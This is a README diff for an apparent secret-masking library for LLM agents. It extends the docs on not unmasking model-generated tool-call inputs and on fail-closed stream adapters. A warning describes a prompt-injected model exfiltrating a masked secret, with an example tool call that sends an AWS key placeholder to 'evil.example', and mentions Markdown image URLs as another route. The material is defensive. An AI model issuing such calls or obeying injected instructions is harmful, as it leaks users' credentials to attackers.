@@ -175,7 +175,14 @@ const output = await safeChatAgent('Here is my token: sk-ant-api03-... please de
 - Genuine binary (images, audio) is left byte-for-byte intact. Text inside binary formats such as PDFs is **not** scanned.
 
 > ⚠️ **Unmasking model output re-introduces the real secret into whatever consumes it.** A prompt-injected model can try to exfiltrate a secret by writing its placeholder somewhere that leaves your machine, for example a tool argument (`http_get({ url: "https://evil.example/?k=[AWS_ACCESS_KEY_ID_1]" })`) or a Markdown image URL your UI renders.
-> - Model-generated **tool-call inputs are therefore not unmasked by default** (`tool_use.input`, OpenAI `function.arguments`). Opt in only for tools you trust with real secrets: `unmaskToolInputs: true`, or a predicate like `unmaskToolInputs: (name) => name === 'write_env_file'`. This works with `unmaskDeep`, both stream adapters and `wrapAgent`.
+> - Model-generated **tool-call inputs are therefore not unmasked by default** (deny-by-default). This covers:
+>   - Anthropic `input` on `tool_use` / `server_tool_use` / `mcp_tool_use` blocks, and `partial_json`;
+>   - OpenAI `arguments`, including later stream deltas without a `name`;
+>   - Responses API `function_call_arguments` events;
+>   - Gemini and LangChain `args`, and Vercel AI SDK tool `input`.
+>
+>   Opt in only for tools you trust with real secrets: `unmaskToolInputs: true`, or a predicate like `unmaskToolInputs: (name) => name === 'write_env_file'`. This works with `unmaskDeep`, both stream adapters and `wrapAgent`.
+> - The stream adapters also **fail closed**: event and chunk shapes they do not recognise pass through with their placeholders intact.
 > - For text, only unmask output that goes to a trusted destination (a local file, the user's own terminal), not into HTML or Markdown that loads remote resources.
 
 ```typescript
